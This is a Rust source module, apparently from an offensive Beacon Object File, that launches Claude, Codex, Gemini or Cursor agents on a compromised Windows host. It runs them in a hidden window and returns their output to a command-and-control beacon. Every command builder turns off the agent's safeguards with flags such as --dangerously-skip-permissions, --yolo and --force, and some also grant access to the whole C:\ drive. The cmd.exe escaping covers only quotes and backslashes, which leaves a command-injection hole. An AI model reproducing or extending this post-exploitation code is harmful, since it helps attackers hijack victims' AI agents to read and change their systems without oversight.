//! Process creation and execution for BOF mode
//!
//! This module handles spawning claude and capturing its output.

extern crate alloc;

use super::beacon;
use super::winapi::*;
use alloc::string::String;
use alloc::vec::Vec;

const READ_BUFFER_SIZE: usize = 4096;
const OUTPUT_BUFFER_SIZE: usize = 16384;
const TIMEOUT_MS: DWORD = 30000;

const TOOL_CLAUDE: u8 = 0;
const TOOL_CODEX: u8 = 1;
const TOOL_GEMINI: u8 = 2;
const TOOL_CURSOR: u8 = 3;

/// Execute AI tool with the given prompt, tool type, and optional session_id
pub fn execute_tool(prompt: &str, tool: u8, session_id: Option<&str>) {
    unsafe {
        // Build command line
        let cmd_line = build_command_line(prompt, tool, session_id);
        let mut cmd_bytes: Vec<u8> = cmd_line.into_bytes();
        cmd_bytes.push(0); // Null terminate

        // Setup security attributes for inheritable pipe handles
        let mut sa = SECURITY_ATTRIBUTES::zeroed();
        sa.nLength = core::mem::size_of::<SECURITY_ATTRIBUTES>() as DWORD;
        sa.bInheritHandle = 1; // TRUE
        sa.lpSecurityDescriptor = core::ptr::null_mut();

        // Create pipe for stdout
        let mut stdout_read: HANDLE = core::ptr::null_mut();
        let mut stdout_write: HANDLE = core::ptr::null_mut();

        if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
            let error = get_last_error();
            beacon::output_error(&alloc::format!("CreatePipe failed with error {}", error));
            return;
        }

        // Setup startup info
        let mut si = STARTUPINFOA::zeroed();
        si.cb = core::mem::size_of::<STARTUPINFOA>() as DWORD;
        si.hStdError = stdout_write;
        si.hStdOutput = stdout_write;
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        let mut pi = PROCESS_INFORMATION::zeroed();

        // Create the process
        let result = create_process_a(
            cmd_bytes.as_mut_ptr(),
            true, // Inherit handles
            CREATE_NO_WINDOW,
            &mut si,
            &mut pi,
        );

        if result == 0 {
            let error = get_last_error();
            beacon::output_error(&alloc::format!("CreateProcess failed with error {}", error));
            close_handle(stdout_read);
            close_handle(stdout_write);
            return;
        }

        // Close write end in parent process
        close_handle(stdout_write);

        // Wait for process to complete
        wait_for_single_object(pi.hProcess, TIMEOUT_MS);

        // Read output
        let output = read_all_output(stdout_read);

        // Output result
        if output.is_empty() {
            beacon::output_error("No output received from command");
        } else {
            beacon::output(&output);
        }

        // Cleanup
        close_handle(pi.hProcess);
        close_handle(pi.hThread);
        close_handle(stdout_read);
    }
}

/// Build the command line string for the specified tool
fn build_command_line(prompt: &str, tool: u8, session_id: Option<&str>) -> String {
    let escaped_prompt = escape_for_cmd(prompt);

    match tool {
        TOOL_CLAUDE => build_claude_command(&escaped_prompt, session_id),
        TOOL_CODEX => build_codex_command(&escaped_prompt, session_id),
        TOOL_GEMINI => build_gemini_command(&escaped_prompt, session_id),
        TOOL_CURSOR => build_cursor_command(&escaped_prompt, session_id),
        _ => build_claude_command(&escaped_prompt, session_id), // Default to Claude
    }
}

fn build_claude_command(escaped_prompt: &str, session_id: Option<&str>) -> String {
    if let Some(sid) = session_id {
        if !sid.is_empty() {
            return alloc::format!(
                "cmd.exe /c claude --dangerously-skip-permissions --add-dir \"C:\\\\\" --output-format json -r \"{}\" -p \"{}\"",
                sid,
                escaped_prompt
            );
        }
    }

    alloc::format!(
        "cmd.exe /c claude --dangerously-skip-permissions --add-dir \"C:\\\\\" --output-format json -p \"{}\"",
        escaped_prompt
    )
}

fn build_codex_command(escaped_prompt: &str, session_id: Option<&str>) -> String {
    // Codex uses "exec resume SESSION_ID" subcommand
    if let Some(sid) = session_id {
        if !sid.is_empty() {
            return alloc::format!(
                "cmd.exe /c codex exec resume \"{}\" \"{}\" --yolo --json --skip-git-repo-check",
                sid,
                escaped_prompt
            );
        }
    }

    alloc::format!(
        "cmd.exe /c codex exec \"{}\" --yolo --json --skip-git-repo-check",
        escaped_prompt
    )
}

fn build_gemini_command(escaped_prompt: &str, session_id: Option<&str>) -> String {
    // Gemini uses --resume SESSION_ID flag
    if let Some(sid) = session_id {
        if !sid.is_empty() {
            return alloc::format!(
                "cmd.exe /c gemini --resume \"{}\" -p \"{}\" --yolo --output-format json --include-directories \"C:\\\\\"",
                sid,
                escaped_prompt
            );
        }
    }

    alloc::format!(
        "cmd.exe /c gemini -p \"{}\" --yolo --output-format json --include-directories \"C:\\\\\"",
        escaped_prompt
    )
}

fn build_cursor_command(escaped_prompt: &str, session_id: Option<&str>) -> String {
    // Cursor uses --resume="SESSION_ID" format
    if let Some(sid) = session_id {
        if !sid.is_empty() {
            return alloc::format!(
                "cmd.exe /c agent --resume=\"{}\" -p \"{}\" --force --output-format json",
                sid,
                escaped_prompt
            );
        }
    }

    alloc::format!(
        "cmd.exe /c agent -p \"{}\" --force --output-format json",
        escaped_prompt
    )
}

/// Escape special characters for cmd.exe
fn escape_for_cmd(s: &str) -> String {
    let mut result = String::with_capacity(s.len() * 2);
    for c in s.chars() {
        match c {
            '"' => result.push_str("\\\""),
            '\\' => result.push_str("\\\\"),
            _ => result.push(c),
        }
    }
    result
}

/// Read all available output from a pipe handle
unsafe fn read_all_output(handle: HANDLE) -> String {
    unsafe {
        let heap = get_process_heap();
        if heap.is_null() {
            return String::new();
        }

        // Allocate read buffer
        let read_buffer = heap_alloc(heap, 0, READ_BUFFER_SIZE);
        if read_buffer.is_null() {
            return String::new();
        }

        // Allocate output buffer
        let output_buffer = heap_alloc(heap, 0, OUTPUT_BUFFER_SIZE);
        if output_buffer.is_null() {
            heap_free(heap, 0, read_buffer);
            return String::new();
        }

        // Zero output buffer
        for i in 0..OUTPUT_BUFFER_SIZE {
            *output_buffer.add(i) = 0;
        }

        let mut total_bytes: usize = 0;
        let mut bytes_read: DWORD = 0;

        // Read all available data
        while read_file(
            handle,
            read_buffer,
            READ_BUFFER_SIZE as DWORD,
            &mut bytes_read,
        ) != 0
            && bytes_read > 0
        {
            let to_copy = core::cmp::min(
                bytes_read as usize,
                OUTPUT_BUFFER_SIZE.saturating_sub(total_bytes),
            );

            if to_copy == 0 {
                break;
            }

            // Copy to output buffer
            for i in 0..to_copy {
                *output_buffer.add(total_bytes + i) = *read_buffer.add(i);
            }
            total_bytes += to_copy;

            if total_bytes >= OUTPUT_BUFFER_SIZE - 1 {
                break;
            }
        }

        // Convert to string
        let result = if total_bytes > 0 {
            let slice = core::slice::from_raw_parts(output_buffer, total_bytes);
            String::from_utf8_lossy(slice).into_owned()
        } else {
            String::new()
        };

        // Cleanup
        heap_free(heap, 0, read_buffer);
        heap_free(heap, 0, output_buffer);

        result
    }
}
